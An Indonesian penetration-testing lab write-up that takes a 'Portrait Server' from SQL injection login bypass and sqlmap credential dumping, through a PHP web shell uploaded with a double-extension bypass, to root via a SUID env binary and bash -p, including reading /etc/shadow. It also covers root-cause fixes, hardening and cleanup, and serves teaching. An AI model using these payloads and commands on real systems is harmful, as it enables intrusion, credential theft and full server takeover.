# Write-Up Privilege Escalation pada Portrait Server

> **Tujuan pembelajaran:** memahami alur pengujian keamanan dari tahap reconnaissance, memperoleh akses awal, mengunggah web shell, melakukan enumerasi sistem, hingga privilege escalation dari user `www-data` menjadi `root`.
>
> **Ruang lingkup:** write-up ini dibuat untuk lingkungan laboratorium yang telah memperoleh izin pengujian. Jangan menjalankan teknik berikut pada sistem yang tidak Anda miliki atau tidak memberikan izin tertulis.

---

## 1. Executive Summary

| Komponen | Informasi |
|---|---|
| Target | `192.168.56.118:8080` |
| Sistem Operasi | Ubuntu 22.04.5 LTS (Jammy Jellyfish) |
| Kernel | `5.15.0-178-generic` |
| Web Server | Apache HTTP Server |
| Database | MariaDB 10.6.23 |
| Akses Awal | `www-data` (`uid=33`) |
| Akses Akhir | `root` melalui `euid=0` |
| Tingkat Risiko | **Critical** |

### Kerentanan yang Ditemukan

1. **SQL Injection pada halaman login**
   - Penyerang dapat memanipulasi query autentikasi.
   - Kerentanan ini memungkinkan bypass login dan ekstraksi data database.

2. **Unrestricted File Upload / File Upload Bypass**
   - Validasi file hanya mengandalkan nama ekstensi atau MIME type dari klien.
   - File PHP dapat diunggah dengan teknik double extension dan kemudian dieksekusi oleh server.

3. **SUID Binary Misconfiguration pada `/usr/local/bin/env`**
   - Binary `env` dimiliki oleh `root` dan memiliki bit SUID.
   - User biasa dapat menjalankan perintah dengan effective user ID milik `root`.

### Rangkaian Serangan

```text
Reconnaissance
      ↓
Menemukan halaman /administrator dan /profile
      ↓
SQL Injection pada login
      ↓
Mendapatkan kredensial administrator
      ↓
Login dan mengakses fitur upload avatar
      ↓
Upload web shell PHP
      ↓
Remote Command Execution sebagai www-data
      ↓
Enumerasi SUID binary
      ↓
Eksploitasi /usr/local/bin/env
      ↓
Privilege Escalation menjadi root
```

---

## 2. Konsep Dasar untuk Pentester Pemula

### 2.1 Apa Itu Initial Access?

**Initial access** adalah akses pertama yang berhasil diperoleh pada target. Pada pengujian ini, akses awal diperoleh melalui web shell yang berjalan sebagai user Apache:

```text
uid=33(www-data)
```

User `www-data` biasanya digunakan oleh Apache atau Nginx. Hak aksesnya seharusnya terbatas agar kompromi aplikasi web tidak langsung memberikan kendali penuh atas server.

### 2.2 Apa Itu Privilege Escalation?

**Privilege escalation** adalah proses meningkatkan hak akses dari user dengan privilege rendah menjadi user dengan privilege lebih tinggi.

Pada write-up ini:

```text
www-data → root
```

### 2.3 Apa Perbedaan UID dan EUID?

- **UID** adalah identitas asli proses.
- **EUID** atau **effective user ID** adalah identitas yang digunakan sistem ketika memeriksa hak akses proses.

Contoh hasil eksploitasi:

```text
uid=33(www-data) gid=33(www-data) euid=0(root)
```

Walaupun UID masih `www-data`, proses memiliki EUID `0`, sehingga perintah berjalan dengan hak akses `root`.

### 2.4 Apa Itu SUID?

SUID adalah permission khusus pada file executable Linux. Ketika binary dengan SUID dijalankan, proses menggunakan privilege pemilik file tersebut.

Contoh:

```text
-rwsr-xr-x 1 root root 48192 /usr/local/bin/env
```

Huruf `s` pada bagian permission pemilik menunjukkan bahwa bit SUID aktif.

Jika binary dimiliki oleh `root`, maka binary tersebut dapat berjalan dengan effective UID `root`.

---

## 3. Phase 1 — Reconnaissance

Reconnaissance bertujuan mengidentifikasi service, port, teknologi, dan endpoint yang tersedia pada target.

---

### 3.1 Pemindaian Nmap

Jalankan:

```bash
nmap -Pn -sC -sV -O 192.168.56.118 -oA nmap-deep
```

### Penjelasan Opsi

| Opsi | Fungsi |
|---|---|
| `-Pn` | Menganggap target aktif tanpa melakukan host discovery terlebih dahulu |
| `-sC` | Menjalankan default NSE scripts |
| `-sV` | Mendeteksi versi service |
| `-O` | Mencoba mendeteksi sistem operasi |
| `-oA nmap-deep` | Menyimpan hasil dalam format normal, XML, dan grepable |

### Hasil Penting

```text
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache httpd
| http-server-header: Apache
| http-title: Portrait Studio — Timeless Photography

Running: Linux 4.x|5.x
OS details: Linux 4.15 - 5.19
```

### Interpretasi

Hasil tersebut menunjukkan:

- Aplikasi web berjalan pada port `8080`.
- Web server menggunakan Apache.
- Target kemungkinan menggunakan sistem operasi Linux.
- Halaman utama memiliki judul `Portrait Studio — Timeless Photography`.

Karena hanya port HTTP yang terlihat terbuka, pengujian selanjutnya difokuskan pada aplikasi web.

---

### 3.2 Directory Enumeration

Jalankan:

```bash
dirsearch \
  -u http://192.168.56.118:8080 \
  -e php,html,js
```

### Tujuan

Directory enumeration digunakan untuk menemukan:

- halaman yang tidak ditampilkan di menu utama;
- panel administrator;
- direktori upload;
- endpoint sensitif;
- file backup atau konfigurasi yang terekspos.

### Hasil Menarik

```text
301 /assets        -> /assets/
302 /dashboard     -> /administrator
302 /profile       -> /administrator
301 /uploads       -> /uploads/
```

### Penjelasan Status HTTP

| Status | Arti |
|---|---|
| `200` | Resource dapat diakses |
| `301` | Redirect permanen |
| `302` | Redirect sementara |
| `403` | Akses dilarang |
| `404` | Resource tidak ditemukan |

### Analisis

- `/administrator` diduga merupakan halaman login administrator.
- `/profile` kemungkinan merupakan halaman yang hanya dapat diakses setelah login.
- `/uploads` menjadi lokasi yang perlu diperiksa karena dapat menyimpan file dari pengguna.
- `/dashboard` mengarahkan pengguna ke halaman administrator.

---

## 4. Phase 2 — Initial Access melalui SQL Injection

### 4.1 Identifikasi Form Login

Endpoint yang diuji:

```text
http://192.168.56.118:8080/administrator
```

Form menerima dua parameter:

```text
username
password
```

Request normal kemungkinan menghasilkan query yang secara konseptual menyerupai:

```sql
SELECT *
FROM users
WHERE username = '<INPUT_USERNAME>'
  AND password = '<INPUT_PASSWORD>';
```

Jika input pengguna digabungkan langsung ke query tanpa prepared statement, attacker dapat mengubah logika SQL.

---

### 4.2 Pengujian Login Bypass

Contoh request:

```http
POST /administrator HTTP/1.1
Host: 192.168.56.118:8080
Content-Type: application/x-www-form-urlencoded

username=' OR '1'='1&password=' OR '1'='1
```

Payload:

```sql
' OR '1'='1
```

menghasilkan kondisi yang selalu benar karena:

```sql
'1'='1'
```

### Catatan Penting

Keberhasilan payload tidak hanya dinilai dari status HTTP `200`. Perhatikan juga:

- perubahan isi halaman;
- munculnya dashboard;
- cookie session baru;
- redirect ke halaman administrator;
- munculnya menu logout;
- perbedaan panjang response.

---

### 4.3 Validasi dengan SQLMap

> Gunakan SQLMap hanya pada sistem yang telah memberikan izin pengujian.

#### Menguji Parameter `username`

```bash
sqlmap \
  -u 'http://192.168.56.118:8080/administrator' \
  --data='username=admin&password=test' \
  -p username \
  --batch \
  --level=2
```

### Penjelasan

| Opsi | Fungsi |
|---|---|
| `-u` | URL target |
| `--data` | Data POST yang dikirim |
| `-p username` | Hanya menguji parameter `username` |
| `--batch` | Menggunakan jawaban default tanpa interaksi |
| `--level=2` | Meningkatkan jumlah pengujian |

---

### 4.4 Mengidentifikasi Database

```bash
sqlmap \
  -u 'http://192.168.56.118:8080/administrator' \
  --data='username=admin&password=test' \
  -p username \
  --batch \
  --banner \
  --current-user \
  --current-db
```

Hasil:

```text
banner: '10.6.23-MariaDB-0ubuntu0.22.04.1'
current user: 'portrait_app@localhost'
current database: 'portrait'
```

### Interpretasi

- Database menggunakan MariaDB.
- Aplikasi terhubung sebagai `portrait_app@localhost`.
- Database aktif bernama `portrait`.

---

### 4.5 Enumerasi Tabel

```bash
sqlmap \
  -u 'http://192.168.56.118:8080/administrator' \
  --data='username=admin&password=test' \
  -p username \
  --batch \
  -D portrait \
  --tables
```

Hasil:

```text
+---------+
| content |
| users   |
+---------+
```

Tabel `users` menjadi target utama karena kemungkinan menyimpan akun administrator.

---

### 4.6 Ekstraksi Kredensial

```bash
sqlmap \
  -u 'http://192.168.56.118:8080/administrator' \
  --data='username=admin&password=test' \
  -p username \
  --batch \
  -D portrait \
  -T users \
  --dump
```

Hasil:

```text
username: admin
password: AdminPortr417126
```

### Dampak

SQL Injection memungkinkan attacker:

- melewati autentikasi;
- membaca struktur database;
- mengekstrak kredensial;
- mengakses fungsi yang hanya tersedia untuk administrator.

---

## 5. Phase 3 — File Upload Bypass

Setelah mendapatkan akun administrator, attacker dapat mengakses halaman:

```text
/profile
```

Halaman ini menyediakan fungsi upload avatar.

---

### 5.1 Percobaan Awal

File berikut ditolak:

```text
shell.php
```

Pesan aplikasi:

```text
Server only accepts JPG, PNG, GIF
```

Hal ini menunjukkan aplikasi memiliki validasi file, tetapi belum tentu validasinya aman.

---

### 5.2 Membuat Web Shell Minimal

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

Isi file:

```php
<?php system($_GET["cmd"]); ?>
```

### Cara Kerja

Parameter URL `cmd` diteruskan ke fungsi PHP `system()`.

Contoh:

```text
shell.php?cmd=id
```

akan menjalankan:

```bash
id
```

di server.

> Web shell ini hanya digunakan untuk pembuktian pada laboratorium. Setelah pengujian selesai, file harus dihapus.

---

### 5.3 Bypass dengan Double Extension

File diunggah dengan nama:

```text
marker118.php.jpg
```

Perintah:

```bash
curl -X POST \
  http://192.168.56.118:8080/profile \
  -F "avatar=@shell.php;filename=marker118.php.jpg;type=image/jpeg" \
  -b "PHPSESSID=<SESSION_ID>"
```

Ganti:

```text
<SESSION_ID>
```

dengan session ID yang diperoleh setelah login.

### Mengapa Dapat Berhasil?

Kemungkinan aplikasi hanya memeriksa:

- ekstensi terakhir `.jpg`;
- MIME type yang dikirim klien;
- string nama file tanpa memverifikasi isi sebenarnya.

MIME type pada request HTTP dapat dimanipulasi oleh klien, sehingga tidak boleh dijadikan satu-satunya mekanisme validasi.

---

### 5.4 Memeriksa Ekstensi yang Dieksekusi

Contoh pengujian:

```bash
for ext in php php3 php4 php5 phtml phar inc pht phps; do
  echo "Testing marker118.$ext"
  curl -s \
    "http://192.168.56.118:8080/uploads/marker118.$ext?cmd=id"
done
```

Hasil pengujian:

```text
marker118.php   -> uid=33(www-data) gid=33(www-data) groups=33(www-data)
marker118.php3  -> source code tidak dieksekusi
marker118.phtml -> uid=33(www-data) ...
marker118.phar  -> uid=33(www-data) ...
marker118.phps  -> 403 Forbidden
```

### Temuan Penting

Server mengeksekusi beberapa ekstensi sebagai PHP:

```text
.php
.phtml
.phar
```

Hal ini memperbesar kemungkinan bypass validasi upload.

---

### 5.5 Verifikasi Remote Command Execution

Web shell yang berhasil diakses:

```text
http://192.168.56.118:8080/uploads/marker118.php
```

Pengujian:

```bash
curl \
  "http://192.168.56.118:8080/uploads/marker118.php?cmd=id"
```

Hasil:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Artinya, perintah sistem operasi berhasil dijalankan sebagai user `www-data`.

---

## 6. Phase 4 — System Enumeration

Setelah memperoleh command execution, langkah berikutnya adalah memahami lingkungan target.

Definisikan URL web shell:

```bash
BASE_URL="http://192.168.56.118:8080/uploads/marker118.php"
```

Karena perintah dikirim melalui URL, karakter khusus perlu diubah menjadi URL encoding.

Contoh:

```text
spasi → %20
/     → %2F, meskipun sering masih dapat dikirim langsung
>     → %3E
&     → %26
```

Gunakan `curl -G --data-urlencode` agar encoding lebih aman:

```bash
curl -sG \
  --data-urlencode "cmd=id" \
  "$BASE_URL"
```

---

### 6.1 Informasi User

```bash
curl -sG \
  --data-urlencode "cmd=id" \
  "$BASE_URL"
```

Hasil:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Perintah tambahan:

```bash
curl -sG \
  --data-urlencode "cmd=whoami" \
  "$BASE_URL"
```

Hasil:

```text
www-data
```

---

### 6.2 Informasi Sistem Operasi dan Kernel

```bash
curl -sG \
  --data-urlencode "cmd=uname -a" \
  "$BASE_URL"
```

Hasil:

```text
Linux portrait 5.15.0-178-generic #188-Ubuntu SMP
Sun Apr 12 07:19:49 UTC 2026 x86_64 GNU/Linux
```

Periksa versi OS:

```bash
curl -sG \
  --data-urlencode "cmd=cat /etc/os-release" \
  "$BASE_URL"
```

Hasil:

```text
PRETTY_NAME="Ubuntu 22.04.5 LTS"
VERSION_ID="22.04"
UBUNTU_CODENAME=jammy
```

### Mengapa Informasi Ini Penting?

Versi OS dan kernel membantu pentester:

- memahami mekanisme keamanan sistem;
- mencari misconfiguration yang relevan;
- menilai apakah sistem menggunakan paket yang sudah usang;
- menghindari percobaan exploit yang tidak sesuai versi.

Pada pengujian ini, privilege escalation tidak memerlukan exploit kernel karena terdapat kesalahan konfigurasi SUID.

---

### 6.3 Informasi Jaringan

```bash
curl -sG \
  --data-urlencode "cmd=ip address" \
  "$BASE_URL"
```

Alternatif:

```bash
curl -sG \
  --data-urlencode "cmd=ifconfig" \
  "$BASE_URL"
```

Hasil penting:

```text
enp0s3: inet 192.168.56.118/24
```

---

### 6.4 Lokasi Kerja dan Isi Direktori

```bash
curl -sG \
  --data-urlencode "cmd=pwd" \
  "$BASE_URL"
```

Hasil:

```text
/var/www/portrait/uploads
```

Periksa isi direktori:

```bash
curl -sG \
  --data-urlencode "cmd=ls -la" \
  "$BASE_URL"
```

Contoh hasil:

```text
-rw-r--r-- 1 www-data www-data 31 Jul 11 23:13 marker118.php
-rw-r--r-- 1 www-data www-data 31 Jul 11 23:13 marker118.inc
```

---

### 6.5 Pemeriksaan SUID Binary

```bash
curl -sG \
  --data-urlencode \
  "cmd=find / -perm -4000 -type f 2>/dev/null" \
  "$BASE_URL"
```

### Penjelasan Perintah

| Bagian | Fungsi |
|---|---|
| `find /` | Mencari dari root filesystem |
| `-perm -4000` | Mencari file dengan bit SUID |
| `-type f` | Hanya file biasa |
| `2>/dev/null` | Menyembunyikan pesan error permission denied |

Hasil penting:

```text
/usr/local/bin/env
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/mount
/usr/bin/umount
```

### Analisis

Tidak semua binary SUID otomatis dapat dieksploitasi.

Binary standar seperti `passwd`, `mount`, atau `sudo` memang dapat memiliki SUID karena membutuhkan operasi tertentu dengan privilege tinggi.

Temuan yang tidak biasa adalah:

```text
/usr/local/bin/env
```

Binary `env` umumnya tidak memerlukan SUID root.

---

## 7. Phase 5 — Privilege Escalation melalui SUID `env`

### 7.1 Memeriksa Permission Binary

```bash
curl -sG \
  --data-urlencode "cmd=ls -la /usr/local/bin/env" \
  "$BASE_URL"
```

Hasil:

```text
-rwsr-xr-x 1 root root 48192 /usr/local/bin/env
```

### Interpretasi Permission

```text
-rwsr-xr-x
```

- `rwx` untuk pemilik;
- huruf `s` menggantikan `x` pada permission pemilik;
- pemilik file adalah `root`;
- binary akan dijalankan dengan effective UID `root`.

---

### 7.2 Membuktikan Effective UID Root

Jalankan:

```bash
curl -sG \
  --data-urlencode "cmd=/usr/local/bin/env id" \
  "$BASE_URL"
```

Hasil:

```text
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
```

### Bukti Keberhasilan

Bagian terpenting adalah:

```text
euid=0(root)
```

Hal ini membuktikan bahwa command dijalankan dengan effective privilege root.

---

### 7.3 Menjalankan Shell dengan Privilege Dipertahankan

```bash
curl -sG \
  --data-urlencode \
  "cmd=/usr/local/bin/env /bin/bash -p -c 'id; whoami'" \
  "$BASE_URL"
```

Hasil yang diharapkan:

```text
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
root
```

### Fungsi Opsi `-p`

Pada Bash, opsi:

```text
-p
```

digunakan untuk mempertahankan effective privilege ketika shell dijalankan dari binary SUID.

Tanpa opsi tersebut, shell tertentu dapat menurunkan privilege sebagai mekanisme keamanan.

---

### 7.4 Validasi Akses Root secara Aman

Gunakan command non-destruktif:

```bash
curl -sG \
  --data-urlencode \
  "cmd=/usr/local/bin/env /bin/bash -p -c 'id; whoami; head -n 3 /etc/shadow'" \
  "$BASE_URL"
```

Membaca `/etc/shadow` hanya dimaksudkan sebagai bukti bahwa proses memiliki privilege tinggi. Jangan mengubah file sistem, password, SSH key, atau konfigurasi lain kecuali memang disyaratkan dalam laboratorium.

### Indikator Keberhasilan

Privilege escalation dinyatakan berhasil apabila:

1. `id` menampilkan `euid=0(root)`;
2. `whoami` menampilkan `root`;
3. proses dapat membaca resource yang hanya dapat diakses root.

---

## 8. Mengapa SUID `env` Berbahaya?

Fungsi utama `env` adalah:

- menampilkan environment variable;
- mengubah environment untuk proses baru;
- menjalankan command lain.

Contoh penggunaan normal:

```bash
env VAR=value command
```

Ketika `env` memiliki SUID root, command yang dipanggil dapat mewarisi effective privilege root.

Secara konseptual:

```text
www-data
   ↓ menjalankan
SUID-root /usr/local/bin/env
   ↓ menjalankan
/bin/bash -p
   ↓
euid=0(root)
```

Binary yang dapat menjalankan command lain tidak boleh diberikan SUID root tanpa alasan teknis yang sangat kuat.

---

## 9. Attack Path Lengkap

### Tahap 1 — Discovery

```text
Nmap menemukan Apache pada port 8080.
Directory enumeration menemukan /administrator, /profile, dan /uploads.
```

### Tahap 2 — Authentication Compromise

```text
Login form rentan terhadap SQL Injection.
SQLMap mengekstrak akun administrator dari database portrait.
```

### Tahap 3 — Remote Command Execution

```text
Akun administrator membuka akses ke halaman upload.
Validasi upload dilewati dengan double extension.
File PHP disimpan di direktori yang dapat diakses dan dieksekusi melalui web.
```

### Tahap 4 — Local Enumeration

```text
Web shell berjalan sebagai www-data.
Enumerasi filesystem menemukan /usr/local/bin/env dengan SUID root.
```

### Tahap 5 — Root Privilege

```text
/usr/local/bin/env menjalankan /bin/bash -p.
Proses memperoleh euid=0(root).
```

---

## 10. Root Cause Analysis

### 10.1 SQL Injection

Kemungkinan penyebab:

```php
$sql = "SELECT * FROM users
        WHERE username = '$username'
        AND password = '$password'";
```

Input pengguna digabungkan langsung ke query SQL.

#### Perbaikan

Gunakan prepared statement:

```php
$stmt = $pdo->prepare(
    'SELECT id, username, password_hash
     FROM users
     WHERE username = :username'
);

$stmt->execute([
    ':username' => $username
]);

$user = $stmt->fetch();
```

Password harus diverifikasi dengan:

```php
password_verify($password, $user['password_hash']);
```

Jangan menyimpan password dalam plaintext.

---

### 10.2 Unrestricted File Upload

Penyebab umum:

- hanya memeriksa ekstensi terakhir;
- mempercayai `Content-Type` dari klien;
- menyimpan file dengan nama asli;
- menyimpan file di web root;
- mengizinkan interpreter PHP pada direktori upload.

#### Perbaikan

1. Periksa isi file menggunakan server-side MIME detection.
2. Decode file sebagai gambar untuk memastikan format valid.
3. Buat ulang gambar menggunakan library seperti GD atau ImageMagick.
4. Gunakan nama file acak.
5. Simpan upload di luar document root.
6. Nonaktifkan eksekusi script pada direktori upload.
7. Terapkan batas ukuran file.
8. Gunakan allowlist format yang ketat.

Contoh konfigurasi Apache untuk mencegah eksekusi PHP di direktori upload:

```apache
<Directory "/var/www/portrait/uploads">
    Options -ExecCGI
    RemoveHandler .php .phtml .phar
    RemoveType .php .phtml .phar

    <FilesMatch "\.(php|phtml|phar|php[0-9]*)$">
        Require all denied
    </FilesMatch>
</Directory>
```

---

### 10.3 SUID Misconfiguration

Penyebab:

```bash
chmod u+s /usr/local/bin/env
```

atau binary disalin ke `/usr/local/bin` dengan permission yang tidak aman.

#### Perbaikan Langsung

```bash
sudo chmod u-s /usr/local/bin/env
```

Verifikasi:

```bash
ls -l /usr/local/bin/env
```

Permission yang diharapkan:

```text
-rwxr-xr-x
```

Jika file tidak dibutuhkan:

```bash
sudo rm /usr/local/bin/env
```

Bandingkan dengan binary resmi:

```bash
command -v env
ls -l /usr/bin/env
```

---

## 11. Rekomendasi Keamanan

### Prioritas Kritis

1. Hapus bit SUID dari `/usr/local/bin/env`.
2. Hapus seluruh web shell dan file upload berbahaya.
3. Perbaiki SQL Injection menggunakan prepared statement.
4. Reset password administrator dan session aktif.
5. Pindahkan direktori upload ke luar web root.
6. Nonaktifkan eksekusi PHP di direktori upload.

### Prioritas Tinggi

1. Simpan password menggunakan hashing yang kuat.
2. Terapkan least privilege pada user database.
3. Batasi permission user `www-data`.
4. Audit seluruh SUID dan SGID binary.
5. Tinjau log Apache, PHP, dan database untuk mencari aktivitas serupa.
6. Periksa apakah terdapat persistence seperti cron job, SSH key, atau user baru.

### Pemeriksaan SUID Berkala

```bash
find / -xdev -perm -4000 -type f -ls 2>/dev/null
```

Simpan baseline hasil pemeriksaan dan bandingkan secara berkala.

---

## 12. Cleanup Setelah Pengujian

Dalam laboratorium, lakukan pembersihan agar target kembali ke kondisi semula.

### Menghapus Web Shell

```bash
rm -f /var/www/portrait/uploads/marker118.php
rm -f /var/www/portrait/uploads/marker118.inc
rm -f /var/www/portrait/uploads/marker118.phtml
rm -f /var/www/portrait/uploads/marker118.phar
```

### Menghapus SUID yang Tidak Aman

```bash
chmod u-s /usr/local/bin/env
```

### Menghapus Session Lama

Logout dari aplikasi dan hapus cookie lokal:

```bash
rm -f login.cookies
```

### Verifikasi

```bash
find /var/www/portrait/uploads \
  -maxdepth 1 \
  -type f \
  \( -name '*.php' -o -name '*.phtml' -o -name '*.phar' \) \
  -ls
```

Pastikan tidak terdapat file executable yang tidak sah.

---

## 13. Troubleshooting untuk Pemula

### 13.1 Web Shell Hanya Menampilkan Source Code

Kemungkinan penyebab:

- ekstensi tersebut tidak diproses sebagai PHP;
- konfigurasi Apache tidak memetakan ekstensi ke PHP;
- PHP module atau PHP-FPM tidak aktif untuk lokasi tersebut.

Coba periksa ekstensi lain yang diizinkan oleh laboratorium atau periksa konfigurasi handler.

---

### 13.2 Mendapatkan `403 Forbidden`

Kemungkinan:

- Apache memblokir ekstensi tertentu;
- `.htaccess` atau konfigurasi virtual host melarang akses;
- permission file atau directory tidak cukup;
- ModSecurity atau WAF memblokir request.

---

### 13.3 Command dengan Spasi Tidak Berjalan

Gunakan URL encoding:

```bash
curl \
  "$BASE_URL?cmd=uname%20-a"
```

Cara yang lebih aman:

```bash
curl -sG \
  --data-urlencode "cmd=uname -a" \
  "$BASE_URL"
```

---

### 13.4 `bash -p` Tidak Memberikan Root

Periksa:

```bash
/usr/local/bin/env id
```

Jika tidak muncul:

```text
euid=0(root)
```

maka kemungkinan:

- bit SUID telah dihapus;
- filesystem menggunakan opsi `nosuid`;
- binary bukan milik root;
- binary menghapus privilege sebelum menjalankan command;
- hardening sistem mencegah pewarisan privilege.

---

### 13.5 Perintah `find` Menghasilkan Banyak Error

Arahkan standard error ke `/dev/null`:

```bash
find / -perm -4000 -type f 2>/dev/null
```

---

## 14. Bukti Temuan

### Bukti 1 — SQL Injection

```text
Endpoint: POST /administrator
Parameter: username
Database: MariaDB 10.6.23
Database aktif: portrait
User database: portrait_app@localhost
```

### Bukti 2 — Remote Command Execution

```text
URL: /uploads/marker118.php?cmd=id
Output:
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Bukti 3 — SUID Misconfiguration

```text
-rwsr-xr-x 1 root root 48192 /usr/local/bin/env
```

### Bukti 4 — Privilege Escalation

```text
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
```

---

## 15. Ringkasan Risiko

| Temuan | Dampak | Severity |
|---|---|---|
| SQL Injection | Bypass login dan ekstraksi database | Critical |
| Unrestricted File Upload | Remote Command Execution | Critical |
| SUID `env` Misconfiguration | Local Privilege Escalation menjadi root | Critical |

Ketiga kerentanan membentuk attack chain yang memungkinkan attacker berpindah dari akses web tanpa privilege menjadi kendali penuh atas sistem operasi.

---

## 16. Pelajaran Utama

1. Status HTTP `200` tidak selalu berarti login berhasil; bandingkan isi response dan session.
2. Validasi upload harus memeriksa isi file, bukan hanya nama dan MIME type.
3. Direktori upload tidak boleh mengeksekusi script.
4. User web server harus memiliki privilege minimum.
5. Binary SUID yang dapat menjalankan command lain merupakan risiko sangat tinggi.
6. Misconfiguration sederhana dapat lebih mudah dieksploitasi daripada kerentanan kernel.
7. Selalu lakukan cleanup setelah pengujian.
8. Catat command, output, waktu, dan bukti agar hasil pengujian dapat direproduksi.

---

## 17. Checklist Pengujian

### Reconnaissance

- [x] Scan port dan service dengan Nmap
- [x] Enumerasi direktori web
- [x] Identifikasi halaman administrator
- [x] Identifikasi direktori upload

### Initial Access

- [x] Uji login terhadap SQL Injection
- [x] Verifikasi dengan SQLMap
- [x] Enumerasi database dan tabel
- [x] Ekstrak kredensial administrator

### File Upload

- [x] Uji upload file PHP
- [x] Uji double extension
- [x] Identifikasi ekstensi yang diproses sebagai PHP
- [x] Verifikasi command execution

### Privilege Escalation

- [x] Identifikasi user saat ini
- [x] Identifikasi OS dan kernel
- [x] Enumerasi SUID binary
- [x] Analisis `/usr/local/bin/env`
- [x] Verifikasi `euid=0(root)`

### Cleanup

- [ ] Hapus web shell
- [ ] Hapus bit SUID tidak sah
- [ ] Reset kredensial
- [ ] Invalidasi session
- [ ] Audit log dan persistence

---

## 18. Kesimpulan

Portrait Server memiliki tiga kerentanan kritis yang saling berhubungan.

SQL Injection pada halaman login memungkinkan attacker memperoleh akses administrator. Akses tersebut membuka fitur upload yang validasinya dapat dilewati, sehingga attacker dapat mengunggah dan mengeksekusi web shell sebagai `www-data`.

Setelah melakukan enumerasi lokal, ditemukan `/usr/local/bin/env` dengan bit SUID dan kepemilikan `root`. Karena `env` dapat menjalankan command lain, attacker dapat menjalankan Bash dengan effective UID `0` dan memperoleh akses root.

Akar permasalahan bukan hanya satu bug, melainkan kombinasi antara:

- input SQL yang tidak aman;
- validasi upload yang lemah;
- konfigurasi web server yang mengizinkan eksekusi script pada direktori upload;
- kesalahan konfigurasi permission sistem operasi.

Penerapan prepared statement, validasi upload berbasis isi file, pemisahan direktori upload dari web root, least privilege, serta audit SUID berkala dapat memutus seluruh attack chain tersebut.
